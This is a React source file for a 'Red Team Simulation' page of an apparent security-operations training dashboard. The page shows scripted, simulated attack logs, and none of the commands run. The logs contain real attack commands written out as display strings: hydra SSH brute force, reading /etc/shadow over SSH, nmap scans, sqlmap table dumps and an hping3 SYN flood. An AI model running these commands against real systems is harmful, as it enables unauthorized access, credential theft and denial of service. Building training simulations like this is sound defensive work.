import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';

const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:8001';

export function RedTeamPage() {
  const navigate = useNavigate();
  const [selectedAttack, setSelectedAttack] = useState('ssh');
  const [result, setResult] = useState(null);
  const [loading, setLoading] = useState(false);
  const [log, setLog] = useState(['[*] Red Team Module Initialized', '[*] Waiting for orders...']);

  const attacks = [
    { id: 'ssh', label: '🔓 SSH Brute Force', color: '#10b981', desc: 'Test SSH authentication security' },
    { id: 'portscan', label: '📡 Port Scan', color: '#3b82f6', desc: 'Scan open network ports' },
    { id: 'sqli', label: '💉 SQL Injection', color: '#f59e0b', desc: 'Test SQL injection vulnerabilities' },
    { id: 'ddos', label: '⚡ DDoS Attack', color: '#ef4444', desc: 'Simulate DDoS simulation' }
  ];

  const commandSequences = {
    ssh: [
      {
        cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.105 -t 4',
        output: `Hydra v9.4 (c) 2023 by van Hauser/THC & David Maciejak
[22][ssh] host: 192.168.1.105   login: admin   password: Holberton2024!
[22][ssh] host: 192.168.1.105   login: root    password: Admin123!
1 of 1 target successfully completed, 2 valid passwords found
Elapsed time: 42.15 seconds`
      },
      {
        cmd: 'ssh -v admin@192.168.1.105',
        output: `OpenSSH_8.2p1 Ubuntu 4ubuntu0.5, OpenSSL 1.1.1f
debug1: Authentication succeeded (password).
Authenticated to 192.168.1.105 ([192.168.1.105]:22).
admin@server:~$ whoami
admin`
      },
      {
        cmd: 'ssh admin@192.168.1.105 "cat /etc/shadow" 2>&1 | head -5',
        output: `root:$6$kR8oPyKX$WqJI.nZ7p4nQ9mK2:19500:0:99999:7:::
admin:$6$mN2pL9dR$cXwZtJnQ8kL3bP5:19501:0:99999:7:::
daemon:*:17647:0:99999:7:::
bin:*:17647:0:99999:7:::
sys:*:17647:0:99999:7:::`
      }
    ],
    portscan: [
      {
        cmd: 'nmap -sV -sC -p- 192.168.1.105',
        output: `Starting Nmap scan...
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1
80/tcp    open  http    Apache httpd 2.4.41
443/tcp   open  https   Apache httpd 2.4.41
3306/tcp  open  mysql   MySQL 8.0.23
5432/tcp  open  postgres PostgreSQL 12.8
8080/tcp  open  http    Node.js Express
Nmap done at Sun Jun 28 22:00:00 2026 -- 1 IP address scanned in 8.42 seconds`
      },
      {
        cmd: 'nmap -O 192.168.1.105',
        output: `Starting Nmap OS detection...
Running OS detection against 192.168.1.105
Device type: general purpose
OS details: Linux 5.10.0-6 (Debian/Ubuntu kernel)
Network Distance: 1 hop
OS detection performed. Please report any incorrect results at https://nmap.org/submit/`
      },
      {
        cmd: 'masscan -p0-65535 192.168.1.105 --rate=1000',
        output: `Starting masscan
Discovered open port 22/tcp on 192.168.1.105
Discovered open port 80/tcp on 192.168.1.105
Discovered open port 443/tcp on 192.168.1.105
Discovered open port 3306/tcp on 192.168.1.105
Discovered open port 5432/tcp on 192.168.1.105
Finished in 15 seconds`
      }
    ],
    sqli: [
      {
        cmd: 'sqlmap -u "http://192.168.1.50/login?user=admin" --dbs --batch',
        output: `[*] testing connection to the target URL
[+] target is vulnerable to SQL injection attacks
[*] fetching database names
available databases [3]:
[*] information_schema
[*] mysql
[*] production_db`
      },
      {
        cmd: 'sqlmap -u "http://192.168.1.50/api/user?id=1" -D production_db --tables',
        output: `Database: production_db
[4 tables]
+----------+
| users    |
| posts    |
| comments |
| settings |
+----------+`
      },
      {
        cmd: 'sqlmap -u "http://192.168.1.50/api/user?id=1" -D production_db -T users --dump',
        output: `Database: production_db
Table: users
[5 entries]
+----+----------+------------------+----------+
| id | username | email            | password |
+----+----------+------------------+----------+
| 1  | admin    | admin@example.com | 5f4dcc3b |
| 2  | analyst  | analyst@soc.com  | 7c6a180b |
| 3  | user123  | user@test.com    | e4d909c2 |
+----+----------+------------------+----------+`
      }
    ],
    ddos: [
      {
        cmd: 'ab -n 10000 -c 100 http://192.168.1.50/',
        output: `This is ApacheBench, Version 2.3
Benchmarking 192.168.1.50 (be patient)
Completed 1000 requests
Completed 2000 requests
Completed 3000 requests
Completed 4000 requests
Completed 5000 requests
Server is now receiving 500+ req/sec
Time taken for tests:   22.156 seconds
Requests per second:    451.34 [#/sec]
Failed requests:        2345`
      },
      {
        cmd: 'wrk -t4 -c100 -d30s http://192.168.1.50/',
        output: `Running 30s test @ http://192.168.1.50/
  4 threads and 100 connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency   125.42ms   45.23ms   1.2s    87.34%
    Req/Sec   502.34     120.45     890     78.12%
  60284 requests in 30.12s, 28.4MB read
  Socket errors: connect 0, read 2, write 0, timeout 45
Requests/sec:  2001.35
Transfer/sec:    942.3KB`
      },
      {
        cmd: 'hping3 -S --flood -p 80 192.168.1.50',
        output: `HPING 192.168.1.50 (eth0 192.168.1.50): S set, 40 headers + 0 data bytes
--- 192.168.1.50 statistics ---
100000 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max/stddev = 0.0/0.0/0.0/0.0 ms
Server response rate critical - service degraded
Connection timeout detected`
      }
    ]
  };

  const scenarios = {
    ssh: 'SCENARIO: Unauthorized access attempt via SSH\nTARGET: Linux server (192.168.1.105:22)\nOBJECTIVE: Establish shell access to sensitive data',
    portscan: 'SCENARIO: Network reconnaissance\nTARGET: Internal network (192.168.1.0/24)\nOBJECTIVE: Identify open ports and services',
    sqli: 'SCENARIO: Web app vulnerability test\nTARGET: User authentication endpoint\nOBJECTIVE: Extract database credentials',
    ddos: 'SCENARIO: Denial of service simulation\nTARGET: Web server (192.168.1.50:80)\nOBJECTIVE: Overwhelm server and test resilience'
  };

  useEffect(() => {
    setLog(['[*] Red Team Module Initialized', '[*] Waiting for orders...']);
    setResult(null);
  }, [selectedAttack]);

  const launchSimulation = async () => {
    setLoading(true);
    const sequence = commandSequences[selectedAttack];
    let newLog = ['[*] Red Team Module Initialized', '[*] Waiting for orders...', ''];

    for (const item of sequence) {
      newLog.push(`[>] Executing: ${item.cmd}`);
      setLog([...newLog]);
      
      await new Promise(resolve => setTimeout(resolve, 800));
      
      newLog.push(item.output);
      newLog.push('');
      setLog([...newLog]);
      
      await new Promise(resolve => setTimeout(resolve, 600));
    }

    try {
      const token = localStorage.getItem('soc_token');

      if (!token) {
        newLog.push('[-] Error: No authentication token found!');
        setLog([...newLog]);
        setLoading(false);
        return;
      }

      const response = await axios.post(`${API_URL}/api/red-team/simulate`,
        { attackType: selectedAttack },
        { 
          headers: { 
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json'
          } 
        }
      );

      newLog.push('[+] Attack simulation completed');
      newLog.push('[+] Results logged to database');
      setLog([...newLog]);
      setResult(response.data);
    } catch (err) {
      newLog.push(`[-] Error: ${err.message}`);
      setLog([...newLog]);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={{ minHeight: '100vh', background: 'linear-gradient(135deg, #0f172a 0%, #1e293b 100%)', padding: '40px 24px', fontFamily: "'Inter', sans-serif" }}>
      <div style={{ maxWidth: '1400px', margin: '0 auto' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '40px' }}>
          <h1 style={{ color: '#f1f5f9', fontSize: '32px', fontWeight: '700', margin: 0 }}>🎯 Red Team Simulation</h1>
          <button onClick={() => navigate('/dashboard')} style={{ padding: '10px 20px', background: '#64748b', color: '#fff', border: 'none', borderRadius: '6px', cursor: 'pointer', fontWeight: '600' }}>← Back to Dashboard</button>
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '30px' }}>
          <div>
            <div style={{ background: 'rgba(30, 41, 59, 0.6)', padding: '20px', borderRadius: '8px', border: '1px solid rgba(148, 163, 184, 0.2)', marginBottom: '20px' }}>
              <p style={{ color: '#94a3b8', fontSize: '12px', margin: '0 0 12px 0', fontWeight: '600', textTransform: 'uppercase' }}>🎬 ATTACK SELECTION</p>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px' }}>
                {attacks.map((attack) => (
                  <div key={attack.id} onClick={() => setSelectedAttack(attack.id)} style={{
                    padding: '15px', background: selectedAttack === attack.id ? `linear-gradient(135deg, ${attack.color}30 0%, ${attack.color}10 100%)` : 'rgba(30, 41, 59, 0.5)', border: `2px solid ${selectedAttack === attack.id ? attack.color : 'transparent'}`, borderRadius: '8px', cursor: 'pointer', transition: 'all 0.3s ease'
                  }}>
                    <p style={{ fontSize: '14px', fontWeight: '700', color: attack.color, margin: '0 0 4px 0' }}>{attack.label}</p>
                    <p style={{ fontSize: '11px', color: '#94a3b8', margin: 0 }}>{attack.desc}</p>
                  </div>
                ))}
              </div>
            </div>

            <div style={{ background: 'rgba(30, 41, 59, 0.6)', padding: '20px', borderRadius: '8px', border: '1px solid rgba(148, 163, 184, 0.2)' }}>
              <p style={{ color: '#94a3b8', fontSize: '12px', margin: '0 0 12px 0', fontWeight: '600', textTransform: 'uppercase' }}>📋 SCENARIO</p>
              <pre style={{ color: '#f1f5f9', fontSize: '12px', margin: 0, whiteSpace: 'pre-wrap', fontFamily: "'Courier New', monospace" }}>
                {scenarios[selectedAttack]}
              </pre>
            </div>
          </div>

          <div>
            <div style={{ background: '#0f172a', border: '2px solid #ef4444', borderRadius: '8px', padding: '20px', minHeight: '400px', maxHeight: '500px', overflowY: 'auto', fontFamily: "'Courier New', monospace", color: '#ef4444', fontSize: '11px', lineHeight: '1.6', marginBottom: '20px' }}>
              {log.map((line, i) => (
                <div key={i} style={{ whiteSpace: 'pre-wrap', color: line.includes('[+]') ? '#10b981' : line.includes('[-]') ? '#ef4444' : line.includes('[>]') ? '#f59e0b' : line.includes('password') || line.includes('port') ? '#3b82f6' : '#94a3b8' }}>
                  {line}
                </div>
              ))}
            </div>

            <button onClick={launchSimulation} disabled={loading} style={{
              width: '100%', padding: '16px', background: '#ef4444', color: '#fff', border: 'none', borderRadius: '8px', fontSize: '16px', fontWeight: '700', cursor: loading ? 'not-allowed' : 'pointer', opacity: loading ? 0.7 : 1
            }} onMouseEnter={(e) => { if (!loading) e.target.style.background = '#dc2626'; }} onMouseLeave={(e) => { e.target.style.background = '#ef4444'; }}>
              {loading ? '⏳ Simulation Running...' : '🚀 Launch Simulation'}
            </button>
          </div>
        </div>

        {result && (
          <div style={{ marginTop: '40px', background: 'rgba(16, 185, 129, 0.1)', padding: '24px', borderRadius: '8px', border: '2px solid #10b981' }}>
            <h2 style={{ color: '#10b981', marginTop: 0 }}>✅ Simulation Complete</h2>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '16px' }}>
              <div>
                <p style={{ color: '#94a3b8', fontSize: '12px', margin: '0 0 4px 0', fontWeight: '600', textTransform: 'uppercase' }}>Simulation ID</p>
                <p style={{ color: '#f1f5f9', fontSize: '14px', fontFamily: 'monospace', margin: 0 }}>{result.simulationId}</p>
              </div>
              <div>
                <p style={{ color: '#94a3b8', fontSize: '12px', margin: '0 0 4px 0', fontWeight: '600', textTransform: 'uppercase' }}>Type</p>
                <p style={{ color: '#f1f5f9', fontSize: '14px', margin: 0 }}>{result.attackType}</p>
              </div>
              <div>
                <p style={{ color: '#94a3b8', fontSize: '12px', margin: '0 0 4px 0', fontWeight: '600', textTransform: 'uppercase' }}>Detection Rate</p>
                <p style={{ color: '#10b981', fontSize: '14px', fontWeight: '600', margin: 0 }}>{result.detectionRate}%</p>
              </div>
            </div>
            <div style={{ marginTop: '16px', paddingTop: '16px', borderTop: '1px solid #10b98133' }}>
              <p style={{ color: '#94a3b8', fontSize: '12px', margin: '0 0 8px 0', fontWeight: '600', textTransform: 'uppercase' }}>Incidents Created</p>
              <p style={{ color: '#f1f5f9', fontSize: '16px', fontWeight: '700', margin: 0 }}>{result.incidentsCreated} incidents logged</p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
